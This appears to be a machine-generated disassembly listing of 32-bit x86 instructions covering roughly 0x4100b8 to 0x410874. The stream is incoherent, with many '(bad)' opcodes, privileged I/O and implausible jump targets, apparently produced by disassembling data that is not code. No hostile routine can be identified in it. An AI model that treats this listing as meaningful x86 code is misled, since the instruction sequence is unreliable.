  4100b8:	ror    DWORD PTR [edx-0x44],cl
  4100bb:	jae    0x41010c
  4100bd:	in     eax,dx
  4100be:	sbb    eax,0x227b80bd
  4100c3:	ret    0xd6f5
  4100c6:	sbb    cl,BYTE PTR [edx+0xb0af73a]
  4100cc:	xor    BYTE PTR [ebp-0x4998fc7f],ch
  4100d2:	and    DWORD PTR [eax+0x64],esi
  4100d5:	mov    dh,0x10
  4100d7:	scas   al,BYTE PTR es:[edi]
  4100d8:	in     eax,0x71
  4100da:	mov    ?,eax
  4100dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100dd:	cmp    dh,BYTE PTR [ecx]
  4100df:	pop    eax
  4100e0:	jnp    0x410073
  4100e2:	jb     0x41015d
  4100e4:	and    al,0x14
  4100e6:	inc    esi
  4100e7:	add    BYTE PTR [eax+0x73],ah
  4100ea:	pop    es
  4100eb:	sub    ah,ch
  4100ed:	xchg   edi,eax
  4100ee:	pop    ebx
  4100ef:	addr16 jo 0x4100eb
  4100f2:	dec    esi
  4100f3:	(bad)  
  4100f4:	and    bh,cl
  4100f6:	je     0x4100e8
  4100f8:	push   eax
  4100f9:	add    ebp,edi
  4100fb:	fwait
  4100fc:	cmp    al,0x44
  4100fe:	xor    al,0x53
  410100:	cwde   
  410101:	push   ebx
  410102:	or     BYTE PTR [edx-0x4c],bh
  410105:	imul   ecx,DWORD PTR [ebx+0x50],0x6ccd47c8
  41010c:	mov    esi,0x928f911a
  410111:	out    0xd5,al
  410113:	sub    esp,DWORD PTR [edx-0x29cba4df]
  410119:	xchg   ecx,eax
  41011a:	push   cs
  41011b:	dec    ebp
  41011c:	cmc    
  41011d:	fdivr  DWORD PTR [edx+0x114f0fe1]
  410123:	xor    edx,DWORD PTR [esi]
  410125:	scas   eax,DWORD PTR es:[edi]
  410126:	pop    edi
  410127:	and    DWORD PTR [eax],0x19
  41012a:	repz push cs
  41012c:	inc    eax
  41012d:	xchg   edi,eax
  41012e:	ret    
  41012f:	setne  BYTE PTR [edi]
  410132:	fsub   st,st(3)
  410134:	xlat   BYTE PTR ds:[ebx]
  410135:	pop    edx
  410136:	xchg   ecx,eax
  410137:	and    al,0xa0
  410139:	cmp    esp,eax
  41013b:	mov    ecx,0x92b00914
  410140:	add    dh,0xf7
  410143:	xchg   edx,eax
  410144:	retf   0x9a16
  410147:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  410149:	xor    DWORD PTR [esi-0x18],0xfffffff4
  41014d:	mov    edx,esp
  41014f:	lock sbb bl,BYTE PTR [edx-0x3014c3d8]
  410156:	adc    ch,BYTE PTR [edx+0x72e9b75a]
  41015c:	pop    ecx
  41015d:	je     0x410180
  41015f:	dec    ebx
  410160:	adc    bh,bh
  410162:	sub    BYTE PTR [edx],ch
  410164:	jge    0x4100fc
  410166:	sbb    BYTE PTR [ebp+0x45],dh
  410169:	imul   esi,DWORD PTR [ebp+0x48cad27e],0x2eaf495c
  410173:	mov    es,WORD PTR [esi+0x3c]
  410176:	mov    al,ds:0xd24fb901
  41017b:	pop    ecx
  41017c:	(bad)  
  41017d:	loopne 0x4101e2
  41017f:	(bad)  
  410180:	je     0x41017e
  410182:	out    0xd9,eax
  410184:	out    dx,al
  410185:	icebp  
  410186:	mov    ah,0x2d
  410188:	adc    eax,0x1db0cd9e
  41018d:	dec    ebx
  41018e:	xchg   esi,eax
  41018f:	pop    ecx
  410190:	aaa    
  410191:	lods   al,BYTE PTR ds:[esi]
  410192:	inc    esp
  410193:	add    esi,DWORD PTR [edx]
  410195:	dec    edx
  410196:	xor    BYTE PTR [esi-0x72],0x31
  41019a:	scas   eax,DWORD PTR es:[edi]
  41019b:	(bad)  
  41019c:	fadd   QWORD PTR [esi-0x77c217f5]
  4101a2:	(bad)  
  4101a6:	mov    ecx,0xe8570a7d
  4101ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101ac:	jl     0x4101d9
  4101ae:	jns    0x410211
  4101b0:	xchg   BYTE PTR [esi-0x7d],bh
  4101b3:	loopne 0x410227
  4101b5:	sahf   
  4101b6:	imul   esp,DWORD PTR [edx-0x42],0x74da054f
  4101bd:	jno    0x4101ea
  4101bf:	rcl    BYTE PTR [ecx+0x45ed85af],0xcd
  4101c6:	(bad)  
  4101c7:	xchg   ebx,eax
  4101c8:	push   es
  4101c9:	adc    al,dh
  4101cb:	add    BYTE PTR [ebx],bl
  4101cd:	pop    edi
  4101ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101cf:	ins    DWORD PTR es:[edi],dx
  4101d0:	popf   
  4101d1:	(bad)  
  4101d2:	nop
  4101d3:	scas   eax,DWORD PTR es:[edi]
  4101d4:	mov    dl,0xff
  4101d6:	mov    eax,ds:0x32c127f0
  4101db:	mov    DWORD PTR [edx],esp
  4101dd:	push   esi
  4101de:	mov    esp,0x87a4855c
  4101e3:	jae    0x41022f
  4101e5:	xor    eax,DWORD PTR ds:0x30ee86c
  4101eb:	test   eax,0x38fdd757
  4101f1:	mov    al,0x69
  4101f3:	pop    edx
  4101f4:	adc    edx,0x4146bf68
  4101fa:	mov    cl,0x15
  4101fc:	mov    esp,cs
  4101fe:	scas   al,BYTE PTR es:[edi]
  4101ff:	jge    0x410275
  410201:	rcr    BYTE PTR [ebp-0x3],0x3e
  410205:	and    dh,BYTE PTR [ebx-0x41646e32]
  41020b:	and    al,BYTE PTR [edi]
  41020d:	in     al,dx
  41020e:	test   ecx,esi
  410210:	pop    ecx
  410211:	out    dx,al
  410212:	dec    ecx
  410213:	mov    al,ds:0x9fb5ad01
  410218:	inc    ax
  41021a:	lahf   
  41021b:	scas   eax,DWORD PTR es:[edi]
  41021c:	dec    esi
  41021d:	xchg   DWORD PTR [edx+0x61],edx
  410220:	dec    edi
  410221:	pop    ecx
  410222:	adc    edi,eax
  410224:	and    bl,BYTE PTR [edi+0x725133f0]
  41022a:	add    al,0x2b
  41022c:	jmp    0x935:0xba06ee2c
  410233:	xor    al,0xd4
  410235:	cmp    eax,DWORD PTR [esi]
  410237:	pop    edx
  410238:	mov    ah,0xd4
  41023a:	sub    DWORD PTR [ecx+edx*8+0x5857b4dc],esi
  410241:	push   ecx
  410242:	mov    dl,0xe8
  410244:	adc    DWORD PTR [ecx-0x1ab15b45],0x8bae31f1
  41024e:	inc    ebp
  41024f:	adc    BYTE PTR [esi-0x63],ch
  410252:	ror    BYTE PTR [edx-0x4e],1
  410255:	in     eax,0x80
  410257:	dec    ecx
  410258:	mov    bl,BYTE PTR [eax+0x655658cd]
  41025e:	outs   dx,DWORD PTR ds:[esi]
  41025f:	lahf   
  410260:	lods   eax,DWORD PTR ds:[esi]
  410261:	stc    
  410262:	neg    DWORD PTR [ebx+0x22bc1574]
  410268:	ds push esp
  41026a:	xchg   ecx,eax
  41026b:	pop    edx
  41026c:	lahf   
  41026d:	int3   
  41026e:	ss das 
  410270:	into   
  410271:	popa   
  410272:	dec    ecx
  410273:	or     BYTE PTR [eax+ecx*4],ah
  410276:	ds jmp 0x39c7d34e
  41027c:	jb     0x410246
  41027e:	lods   al,BYTE PTR ds:[esi]
  41027f:	shr    BYTE PTR [edi],1
  410281:	push   edi
  410282:	bound  esp,QWORD PTR [ebp+esi*8+0x70489837]
  410289:	push   cs
  41028a:	or     ebx,DWORD PTR [ebx+0xb]
  41028d:	sbb    al,0x24
  41028f:	xor    al,0xff
  410291:	and    dl,bh
  410293:	or     eax,edi
  410295:	mov    bl,0x1b
  410297:	jno    0x41029a
  410299:	adc    DWORD PTR [esi],eax
  41029b:	out    0x71,eax
  41029d:	mov    ds:0xf66ca3f8,eax
  4102a2:	adc    eax,0x354519a0
  4102a7:	jmp    0x386cf7eb
  4102ac:	inc    esp
  4102ad:	pop    esp
  4102ae:	dec    edi
  4102af:	add    eax,0x8e8bc01e
  4102b4:	pop    ebp
  4102b5:	rcr    ebp,0xd9
  4102b8:	xor    edi,esi
  4102ba:	ret    
  4102bb:	or     al,0xcc
  4102bd:	cwde   
  4102be:	xchg   edx,eax
  4102bf:	popa   
  4102c0:	addr16 sub al,0xc9
  4102c3:	and    edi,edi
  4102c5:	adc    al,0xec
  4102c7:	pop    DWORD PTR [ecx+eax*1]
  4102ca:	xchg   BYTE PTR [ebp+0xa],ch
  4102cd:	and    DWORD PTR [esi+0x17],ebx
  4102d0:	xchg   BYTE PTR [ebx+0x6e],al
  4102d3:	iret   
  4102d4:	mov    ebp,0x7b760a0d
  4102d9:	(bad)
  4102dd:	daa    
  4102de:	lock mov bh,0x9e
  4102e1:	test   DWORD PTR [eax+0x2a589c82],esi
  4102e7:	mov    ds:0xba599007,al
  4102ec:	adc    BYTE PTR [edx-0x6a],ah
  4102ef:	adc    ebp,DWORD PTR [ebx+edx*2-0x3c27766d]
  4102f6:	jne    0x41031e
  4102f8:	add    ch,BYTE PTR [edx*8-0x2b322d06]
  4102ff:	aas    
  410300:	sbb    edx,DWORD PTR [edx+eiz*4+0x47]
  410304:	xor    BYTE PTR [ebx-0x256fe5aa],bh
  41030a:	mov    es,WORD PTR [ebx-0x67]
  41030d:	or     BYTE PTR [eax+0x140bb931],bh
  410313:	scas   eax,DWORD PTR es:[edi]
  410314:	(bad)  [ecx+0x2d874675]
  41031a:	dec    ebx
  41031b:	aam    0x44
  41031d:	xchg   ebx,eax
  41031e:	scas   eax,DWORD PTR es:[edi]
  41031f:	inc    edi
  410320:	adc    DWORD PTR [eax],ebp
  410322:	and    eax,0x887ce337
  410327:	sub    BYTE PTR [edx-0x458da0d4],ah
  41032d:	add    eax,0xf4cd97f1
  410332:	mov    bh,0x15
  410334:	or     bl,al
  410336:	fild   WORD PTR [ecx-0x183092c3]
  41033c:	dec    ebx
  41033d:	push   ss
  41033e:	mov    al,BYTE PTR [edi-0x5bcd7213]
  410344:	add    DWORD PTR ds:0xdda24f7f,esi
  41034a:	pushf  
  41034b:	rol    BYTE PTR [eax+0x504048d],0x6f
  410352:	sub    eax,0x85ebcad0
  410357:	inc    eax
  410358:	dec    esp
  410359:	in     al,0x1d
  41035b:	ret    0x5b83
  41035e:	lds    eax,FWORD PTR [ecx-0x3ee5f1fb]
  410364:	mov    edx,0x3e4252d9
  410369:	sbb    ah,BYTE PTR [edi+0x34]
  41036c:	mov    ebx,0xe2cf2567
  410371:	arpl   WORD PTR [edi],cx
  410373:	push   cs
  410374:	stc    
  410375:	add    eax,DWORD PTR [esi+0x29e21f60]
  41037b:	fbld   TBYTE PTR [edi-0x71]
  41037e:	inc    edx
  41037f:	sub    eax,0x1ecd7cc2
  410384:	das    
  410385:	rcr    edx,cl
  410387:	xchg   ebx,eax
  410388:	fisubr DWORD PTR [edi+0x41]
  41038b:	pop    esp
  41038c:	mov    ecx,0x3654f32
  410391:	imul   edi,DWORD PTR [eax+0x45b77d7a],0x434d0bac
  41039b:	popa   
  41039c:	xor    BYTE PTR ds:0x3bf61aa4,0x5f
  4103a3:	or     DWORD PTR [ebx],eax
  4103a5:	add    edi,DWORD PTR [ebp+0x69edd8fb]
  4103ab:	push   edx
  4103ac:	push   esp
  4103ad:	jno    0x410354
  4103af:	ins    BYTE PTR es:[edi],dx
  4103b0:	pop    ss
  4103b1:	shl    DWORD PTR ds:0xc5fc4e49,1
  4103b7:	add    edx,DWORD PTR [ecx+0x3e604226]
  4103bd:	add    al,0xc7
  4103bf:	(bad)
  4103c3:	int3   
  4103c4:	cmp    ch,cl
  4103c6:	inc    DWORD PTR [eax]
  4103c8:	mov    ebx,0x4ca3bf42
  4103cd:	neg    BYTE PTR [edi]
  4103cf:	aam    0xdc
  4103d1:	cmp    cl,BYTE PTR [ebp+0x313d4497]
  4103d7:	loop   0x4103fd
  4103d9:	xor    dl,BYTE PTR [ebx]
  4103db:	inc    esp
  4103dc:	jl     0x410394
  4103de:	daa    
  4103df:	push   edx
  4103e0:	jmp    0x4103bf
  4103e2:	and    al,0xa3
  4103e4:	int    0x8c
  4103e6:	mov    edi,0x1ce59076
  4103eb:	sub    dl,ah
  4103ed:	mov    eax,ds:0x798f3158
  4103f2:	test   eax,0xd0770c80
  4103f7:	mov    ds:0x9ad3338b,eax
  4103fc:	add    edi,DWORD PTR [esi-0x14]
  4103ff:	(bad)  
  410400:	push   ebx
  410401:	and    ah,BYTE PTR [edx]
  410403:	pop    esi
  410404:	into   
  410405:	out    0x17,eax
  410407:	call   FWORD PTR [esi]
  410409:	lods   eax,DWORD PTR ds:[esi]
  41040a:	imul   ecx,DWORD PTR [edi],0xffffff84
  41040d:	(bad)
  410410:	retf   
  410411:	xor    BYTE PTR ds:0x7cd15899,dh
  410417:	jo     0x410466
  410419:	repz mov ch,0x62
  41041c:	shl    BYTE PTR [ebp+0x571e6111],0xed
  410423:	lea    esi,[ecx-0x6b]
  410426:	pop    ebx
  410427:	jp     0x410402
  410429:	mov    eax,ds:0xfc6a26a6
  41042e:	or     DWORD PTR [ecx+0x22],ebx
  410431:	scas   eax,DWORD PTR es:[edi]
  410432:	jo     0x410467
  410434:	repz test eax,0x9962a938
  41043a:	xchg   edx,eax
  41043b:	shl    BYTE PTR [ecx],1
  41043d:	daa    
  41043e:	pop    ecx
  41043f:	mov    DWORD PTR es:[edx],edx
  410442:	ret    
  410443:	sub    eax,0x23383324
  410448:	dec    edi
  410449:	pop    edi
  41044a:	jmp    0x27f77ff6
  41044f:	pushf  
  410450:	pop    ss
  410451:	xchg   BYTE PTR [edx],ch
  410453:	xor    DWORD PTR [ebx+0x4a],esi
  410456:	or     al,0x3f
  410458:	add    bl,0xa5
  41045b:	sub    al,0x63
  41045d:	lods   al,BYTE PTR ds:[esi]
  41045e:	sub    ebp,ebp
  410460:	popf   
  410461:	aam    0x98
  410463:	stos   DWORD PTR es:[edi],eax
  410464:	or     BYTE PTR [eax],cl
  410466:	add    dh,BYTE PTR [eax-0x6b29bd08]
  41046c:	loope  0x41041b
  41046e:	and    BYTE PTR [eax+0x4f051361],dl
  410474:	fwait
  410475:	mov    ch,0x21
  410477:	add    eax,0x47c38f3b
  41047c:	ins    BYTE PTR es:[edi],dx
  41047d:	cmp    DWORD PTR [ebp-0x191445cb],ebx
  410483:	pavgw  mm2,QWORD PTR [ecx]
  410486:	cmp    ah,dh
  410488:	fcomp  DWORD PTR [ebp+ecx*2-0x52]
  41048c:	mov    ch,0xd1
  41048e:	sbb    DWORD PTR [ecx+0x7a],ebx
  410491:	pop    ebx
  410492:	mov    cl,0x4f
  410494:	out    dx,al
  410495:	mov    ebx,0xb3123ce0
  41049a:	add    DWORD PTR [edi],esi
  41049c:	cmp    bl,dl
  41049e:	mov    esp,0xb1daa436
  4104a3:	(bad)  
  4104a5:	pusha  
  4104a6:	cmp    esi,DWORD PTR [ecx+ecx*4-0x78]
  4104aa:	mov    DWORD PTR [esi+0x57],ebp
  4104ad:	std    
  4104ae:	cmp    DWORD PTR [esi+0x2578a197],ebp
  4104b4:	imul   edx,DWORD PTR [ecx],0x74687785
  4104ba:	loop   0x410491
  4104bc:	loopne 0x410484
  4104be:	stos   BYTE PTR es:[edi],al
  4104bf:	shl    DWORD PTR [eax+0x39],0x7d
  4104c3:	xor    eax,0xe51740a6
  4104c8:	cmp    DWORD PTR [edi-0x35],edx
  4104cb:	ret    
  4104cc:	mov    bl,0x7b
  4104ce:	dec    ecx
  4104cf:	leave  
  4104d0:	outs   dx,BYTE PTR ds:[esi]
  4104d1:	out    dx,al
  4104d2:	(bad)
  4104d5:	inc    esp
  4104d6:	xor    DWORD PTR [eax+0x1649f72a],esi
  4104dc:	xchg   edx,eax
  4104dd:	adc    eax,0x1b62ba6d
  4104e2:	mov    cs,WORD PTR [edx-0x441df92a]
  4104e8:	retf   
  4104e9:	pop    ebx
  4104ea:	or     al,0xa7
  4104ec:	(bad)  
  4104ed:	mov    al,0x8b
  4104ef:	test   DWORD PTR ds:0x5853b15d,ebp
  4104f5:	and    bl,bl
  4104f7:	add    al,BYTE PTR [ecx]
  4104f9:	fidivr DWORD PTR [eax+0x39]
  4104fc:	mov    bh,0x8b
  4104fe:	test   eax,0xc924fa50
  410503:	adc    BYTE PTR [esi-0x68],0x46
  410507:	dec    edx
  410508:	jle    0x410559
  41050a:	pop    edx
  41050b:	data16 int3 
  41050d:	jmp    0x4104f3
  41050f:	in     al,0x56
  410511:	pop    edx
  410512:	rcl    bh,cl
  410514:	lods   al,BYTE PTR ds:[esi]
  410515:	xchg   edi,eax
  410516:	pop    ds
  410517:	pop    ecx
  410518:	dec    ecx
  410519:	std    
  41051a:	adc    BYTE PTR [eax+0x7f],al
  41051d:	int    0x40
  41051f:	add    ebx,DWORD PTR [edi-0x18894ad]
  410525:	lds    ebx,FWORD PTR [edi+eiz*8]
  410528:	pop    edx
  410529:	sar    BYTE PTR [eax-0x6d209a3c],cl
  41052f:	xlat   BYTE PTR ds:[ebx]
  410530:	out    dx,al
  410531:	nop
  410532:	inc    edx
  410533:	adc    BYTE PTR [ebx],0x85
  410536:	add    ebp,DWORD PTR [ecx+0x25fb01e7]
  41053c:	(bad)  [edx+0x709f425]
  410542:	push   edi
  410543:	xchg   ebp,eax
  410544:	popa   
  410545:	jne    0x410511
  410547:	fdiv   DWORD PTR [eax]
  410549:	pop    ebp
  41054a:	inc    ebx
  41054b:	mov    bh,0x62
  41054d:	arpl   bp,di
  41054f:	loop   0x41051e
  410551:	mov    ds:0x67184318,eax
  410556:	or     bl,BYTE PTR [ecx+0xe]
  410559:	es push ebx
  41055b:	sub    BYTE PTR [ecx],0x33
  41055e:	in     al,0xb
  410560:	(bad)  
  410561:	jmp    0x4104e5
  410563:	add    esp,DWORD PTR [edi]
  410565:	iret   
  410566:	cmp    dh,cl
  410568:	fst    DWORD PTR ds:0xef44267d
  41056e:	pusha  
  41056f:	push   ds
  410570:	inc    ebx
  410571:	add    al,0xcf
  410573:	int    0x96
  410575:	xor    DWORD PTR [edi+eiz*2+0x13],edx
  410579:	jmp    0x72c1bcbc
  41057e:	mov    ah,0x2a
  410580:	shl    ebx,1
  410582:	test   eax,0x5266139b
  410587:	repnz xchg ebx,eax
  410589:	jl     0x410586
  41058b:	pop    ecx
  41058c:	cmp    BYTE PTR [esi+0x3d],bh
  41058f:	push   cs
  410590:	adc    BYTE PTR [edi+0x2bef90f4],bl
  410596:	sti    
  410597:	pop    ebx
  410598:	gs dec ebp
  41059a:	xchg   ebp,eax
  41059b:	push   esi
  41059c:	jecxz  0x410601
  41059e:	rcr    DWORD PTR [ecx+0x34e15016],cl
  4105a4:	xlat   BYTE PTR ds:[ebx]
  4105a5:	xchg   esi,eax
  4105a6:	jne    0x4105a4
  4105a8:	adc    BYTE PTR ds:0x3c0bd8d9,0xb0
  4105af:	jmp    0xe3c4:0xa4912655
  4105b6:	mov    ds:0x6c688b83,eax
  4105bb:	mov    dl,0xcc
  4105bd:	aam    0x4e
  4105bf:	pop    eax
  4105c0:	inc    esi
  4105c1:	mov    esi,0xa5b4190f
  4105c6:	adc    DWORD PTR [ecx+0x6d],esp
  4105c9:	(bad)  
  4105ca:	je     0x4105c5
  4105cc:	mov    edx,0xf9c33bd5
  4105d1:	iret   
  4105d2:	inc    esi
  4105d3:	pop    eax
  4105d4:	cli    
  4105d5:	dec    eax
  4105d6:	mov    edx,0x616fa791
  4105db:	int3   
  4105dc:	jp     0x410570
  4105de:	(bad)  
  4105e0:	rol    edx,1
  4105e2:	sbb    DWORD PTR [esi-0x3046f1e4],edi
  4105e8:	or     bh,BYTE PTR [ecx]
  4105ea:	in     eax,0x7d
  4105ec:	ins    DWORD PTR es:[edi],dx
  4105ed:	and    eax,0x5998fbc3
  4105f2:	stos   BYTE PTR es:[edi],al
  4105f3:	pop    ds
  4105f4:	(bad)  
  4105f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105f6:	leave  
  4105f7:	fstp   st(4)
  4105f9:	adc    bh,BYTE PTR [ebp+esi*2-0x3b]
  4105fd:	mov    cs,WORD PTR [eax+ebp*1]
  410600:	popa   
  410601:	inc    eax
  410602:	daa    
  410603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410604:	fadd   QWORD PTR [esi+0x1b]
  410607:	pusha  
  410608:	mov    ecx,0x1b3dfbf6
  41060d:	sub    bh,BYTE PTR [edi]
  41060f:	(bad)  
  410610:	mov    esp,0x60489d38
  410615:	js     0x410616
  410617:	sti    
  410618:	cmp    eax,0x9b037e6c
  41061d:	xchg   edx,eax
  41061e:	push   edx
  41061f:	lea    eax,[ebp+0x2c]
  410622:	push   es
  410623:	(bad)  
  410625:	or     al,0x2a
  410627:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410628:	mov    cl,0xf
  41062a:	mov    edi,0xd8bcc461
  41062f:	pop    ecx
  410630:	imul   edx,DWORD PTR [esi-0x1],0x5b166953
  410637:	push   ecx
  410638:	inc    edi
  410639:	ror    BYTE PTR [esi],cl
  41063b:	scas   al,BYTE PTR es:[edi]
  41063c:	sti    
  41063d:	and    DWORD PTR [ebp-0x553f4769],edi
  410643:	mov    al,ds:0xc5171dc2
  410648:	cli    
  410649:	add    ah,BYTE PTR [eax+0x24]
  41064c:	add    al,0x52
  41064e:	aad    0xb4
  410650:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410651:	jmp    0x509f506a
  410656:	xor    eax,0x3becd411
  41065b:	gs aas 
  41065d:	or     al,0xf8
  41065f:	js     0x410643
  410661:	dec    ebx
  410662:	or     esi,DWORD PTR [edx-0x55]
  410665:	dec    ebp
  410666:	jp     0x4106d7
  410668:	xchg   ebp,eax
  410669:	lods   al,BYTE PTR ds:[esi]
  41066a:	mov    ds,WORD PTR [esi]
  41066c:	jbe    0x410623
  41066e:	in     eax,dx
  41066f:	fcmovb st,st(2)
  410671:	ror    DWORD PTR [esi],1
  410673:	push   0x36e47f63
  410678:	push   ebx
  410679:	repnz popa 
  41067b:	fldenv es:[esi+0x7d]
  41067f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410680:	in     al,0xe5
  410682:	and    dh,dl
  410684:	adc    dl,bl
  410686:	bswap  edx
  410688:	mov    DWORD PTR [ebx+0x33eeccbd],0xc19070f5
  410692:	mov    ?,ecx
  410694:	out    dx,al
  410695:	mov    ebx,0xd41a40b7
  41069a:	push   ecx
  41069b:	xchg   esp,eax
  41069c:	jbe    0x41062b
  41069e:	adc    al,0x92
  4106a0:	xchg   ebx,eax
  4106a1:	(bad)
  4106a5:	lahf   
  4106a6:	std    
  4106a7:	push   eax
  4106a8:	and    al,0x9b
  4106aa:	jecxz  0x4106e4
  4106ac:	clc    
  4106ad:	idiv   dl
  4106af:	xchg   ebp,eax
  4106b0:	enter  0x153a,0x9a
  4106b4:	xchg   ecx,eax
  4106b5:	fsub   st,st(7)
  4106b7:	out    dx,eax
  4106b8:	rcl    ah,cl
  4106ba:	jno    0x41072e
  4106bc:	cdq    
  4106bd:	sub    esp,ebp
  4106bf:	rol    DWORD PTR [edi-0x32],1
  4106c2:	cwde   
  4106c3:	(bad)  
  4106c4:	cld    
  4106c5:	test   edi,edx
  4106c7:	in     eax,0xbb
  4106c9:	scas   al,BYTE PTR es:[edi]
  4106ca:	stc    
  4106cb:	adc    esi,DWORD PTR [ebx-0x3d]
  4106ce:	push   edi
  4106cf:	iret   
  4106d0:	adc    al,0x1e
  4106d2:	fcom   DWORD PTR [ecx+0x7f3d42c8]
  4106d8:	ror    BYTE PTR [edi+0x20],1
  4106db:	push   ss
  4106dc:	pop    edx
  4106dd:	or     al,0xce
  4106df:	cmp    eax,0xa939450a
  4106e4:	xchg   ecx,eax
  4106e5:	jnp    0x4106fa
  4106e7:	clc    
  4106e8:	nop
  4106e9:	je     0x41070f
  4106eb:	sbb    dh,BYTE PTR [eax-0x5c]
  4106ee:	sbb    al,0x4c
  4106f0:	push   ss
  4106f1:	mov    cl,0x8
  4106f3:	adc    al,0x54
  4106f5:	sub    ebx,DWORD PTR [ebx]
  4106f7:	sub    bh,BYTE PTR [edx+0x4fb2731]
  4106fd:	sbb    al,0xe8
  4106ff:	xor    BYTE PTR [ebp-0x1],0x6
  410703:	pop    eax
  410704:	xor    BYTE PTR ds:0xb738774b,0x98
  41070b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41070c:	mov    DWORD PTR [ebx-0x2a],esi
  41070f:	pop    ebx
  410710:	fcmovb st,st(5)
  410712:	dec    esi
  410713:	lods   al,BYTE PTR ds:[esi]
  410714:	or     cl,BYTE PTR [esi]
  410716:	jle    0x41078f
  410718:	arpl   WORD PTR [ecx],di
  41071a:	add    al,BYTE PTR [ecx-0x24]
  41071d:	mul    DWORD PTR [ecx]
  41071f:	jo     0x41074e
  410721:	add    BYTE PTR [edx+0x6f757b91],al
  410727:	fild   QWORD PTR [edi-0x10]
  41072a:	lds    esi,FWORD PTR [edi+ebx*8-0x778952d0]
  410731:	es add al,0x5e
  410734:	scas   al,BYTE PTR es:[edi]
  410735:	and    bh,al
  410737:	sbb    eax,0xe4e476e2
  41073c:	addr16 pop ebp
  41073e:	mov    ecx,0x722ccc1f
  410743:	and    bl,al
  410745:	jne    0x4107b4
  410747:	xchg   esi,eax
  410748:	stc    
  410749:	scas   eax,DWORD PTR es:[edi]
  41074a:	sbb    al,BYTE PTR [edi+0x72ad4ab5]
  410750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410751:	das    
  410752:	(bad)  [edi]
  410754:	pop    ebp
  410755:	cmp    ebp,DWORD PTR [edx+0x5f]
  410758:	popa   
  410759:	lea    ecx,[eax]
  41075b:	inc    edx
  41075c:	dec    edx
  41075d:	enter  0xb710,0x4e
  410761:	xor    BYTE PTR [edx],dl
  410763:	lea    esp,[ecx]
  410765:	jmp    0x41072a
  410767:	add    eax,DWORD PTR [esi]
  410769:	fucom  st(5)
  41076b:	std    
  41076c:	adc    edi,edi
  41076e:	aam    0x55
  410770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410771:	xor    al,0x5b
  410773:	mov    bl,BYTE PTR [ebx+0x5772b498]
  410779:	adc    DWORD PTR [edi],esi
  41077b:	jle    0x41078f
  41077d:	sub    esp,edi
  41077f:	dec    esi
  410780:	cld    
  410781:	jmp    DWORD PTR [ecx+ecx*4+0x5fbb1878]
  410788:	add    al,0xb0
  41078a:	aas    
  41078b:	(bad)  
  41078c:	lods   al,BYTE PTR ds:[esi]
  41078d:	xor    DWORD PTR [ebx],ebx
  41078f:	(bad)  
  410790:	push   0x6d
  410792:	xchg   esi,eax
  410793:	cmp    al,0x3
  410795:	mov    WORD PTR [eax],?
  410797:	lahf   
  410798:	fisubr WORD PTR [ebx-0x16fbd2d6]
  41079e:	mov    edi,0x6dd65157
  4107a3:	clc    
  4107a4:	lock retf 
  4107a6:	test   esp,esp
  4107a8:	rol    BYTE PTR [ecx],1
  4107aa:	sti    
  4107ab:	in     al,0x9b
  4107ad:	add    DWORD PTR [ebx+0x2c3531b4],eax
  4107b3:	(bad)  
  4107b4:	int    0xbe
  4107b6:	jns    0x410810
  4107b8:	inc    ebx
  4107b9:	cmp    BYTE PTR [edx+0x331efe14],ah
  4107bf:	pop    ebx
  4107c0:	loope  0x410778
  4107c2:	add    ebx,ebx
  4107c4:	arpl   WORD PTR [ebp+0x2e40e99],bx
  4107ca:	sbb    eax,ebx
  4107cc:	ds aad 0xb8
  4107cf:	fdivr  DWORD PTR [eax+eiz*4+0x585128a3]
  4107d6:	push   edx
  4107d7:	xor    ebx,ebx
  4107d9:	lods   eax,DWORD PTR ds:[esi]
  4107da:	mov    cl,dh
  4107dc:	adc    DWORD PTR [ebx+0x68],0x66983021
  4107e3:	add    BYTE PTR [edi+ebp*2-0x3a4135ca],ah
  4107ea:	inc    ebp
  4107eb:	mov    ds:0x1e731fe8,al
  4107f0:	shl    eax,0xae
  4107f3:	xor    dh,BYTE PTR [edx-0x10]
  4107f6:	mov    dh,0x59
  4107f8:	xor    eax,0x555d1ee6
  4107fd:	test   bh,bl
  4107ff:	mov    ds:0x75538974,eax
  410804:	pop    es
  410805:	sbb    al,BYTE PTR [eax-0x10f1d5ec]
  41080b:	das    
  41080c:	ret    0xde01
  41080f:	add    esp,DWORD PTR [eax-0x77f23bf3]
  410815:	push   cs
  410816:	test   al,0x57
  410818:	and    bl,BYTE PTR [edi-0x2c0bd706]
  41081e:	pusha  
  41081f:	aad    0xca
  410821:	fisub  DWORD PTR [ebp-0x5b]
  410824:	jne    0x4107ab
  410826:	push   es
  410827:	add    BYTE PTR [edi+0x1740d572],dl
  41082d:	jmp    0x410800
  41082f:	aaa    
  410830:	popf   
  410831:	jbe    0x4107ce
  410833:	cwde   
  410834:	xchg   ebx,eax
  410835:	or     al,0x82
  410837:	mov    al,0xc
  410839:	xor    bh,cl
  41083b:	rcr    dh,0x55
  41083e:	mov    ch,0xbe
  410840:	mov    bh,0xee
  410842:	mov    al,0xef
  410844:	scas   eax,DWORD PTR es:[edi]
  410845:	sub    BYTE PTR [ebx-0x5b],ah
  410848:	dec    ecx
  410849:	push   ss
  41084a:	pushf  
  41084b:	iret   
  41084c:	mov    edx,0x5dc08989
  410851:	(bad)  
  410852:	cdq    
  410853:	push   0x2c
  410855:	pop    es
  410856:	sub    BYTE PTR ds:0xf7582ccc,0x9a
  41085d:	mov    cl,0x85
  41085f:	push   0x11cf9604
  410864:	sbb    DWORD PTR [ebp+0x4f2dd01b],ebp
  41086a:	jb     0x4108a3
  41086c:	push   0xffffffa2
  41086e:	ins    BYTE PTR es:[edi],dx
  41086f:	inc    ecx
  410870:	ins    DWORD PTR es:[edi],dx
  410871:	scas   eax,DWORD PTR es:[edi]
  410872:	dec    ecx
  410873:	std    
  410874:	shl    BYTE PTR [eax+0x28],cl
